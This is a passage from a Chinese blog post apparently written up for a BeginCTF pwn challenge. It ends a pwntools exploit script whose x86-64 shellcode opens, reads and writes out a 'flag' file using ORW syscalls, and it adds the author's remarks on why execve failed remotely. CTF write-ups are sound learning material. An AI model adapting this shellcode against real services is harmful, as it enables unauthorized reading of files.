初始化无关寄存器</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdx  </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # Open</span></span><br><span class="line"><span class="string">    push 2      </span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rdx     </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # Read</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x40</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    # Write</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">"""</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(<span class="string">"f"</span>), <span class="built_in">ord</span>(<span class="string">"l"</span>), <span class="built_in">ord</span>(<span class="string">"g"</span>))</span><br><span class="line"></span><br><span class="line">shellcode_len = <span class="built_in">len</span>(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># shell_encrypt = """</span></span><br><span class="line"><span class="comment">#     call next</span></span><br><span class="line"><span class="comment"># next:</span></span><br><span class="line"><span class="comment">#     pop rdi</span></span><br><span class="line"><span class="comment"># decrypt:</span></span><br><span class="line"><span class="comment">#     lodsb</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     stosb</span></span><br><span class="line"><span class="comment">#     loop decrypt</span></span><br><span class="line"><span class="comment"># """.format(shellcode_len)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b main")</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206172628596.png"></p>
<p>这个题目的远程好像有一些问题，只能用<code>orw</code>来打，如果用<code>execve</code>的话不知道为什么<code>cat</code>的权限不够，可能题目本身就是这么设计的？</p>
<p><img src="/2024/02/06/2023-BeginCTF-Pwn/image-20240206172804734.png"></p>
<p>不管了不管了</p>
<p>还有两三天就过年啦，祝新年快乐！！！！！！！</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2024/01/19/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AFReview/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">软件保护技术复习笔记</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>






</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 晚栀wingee~
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>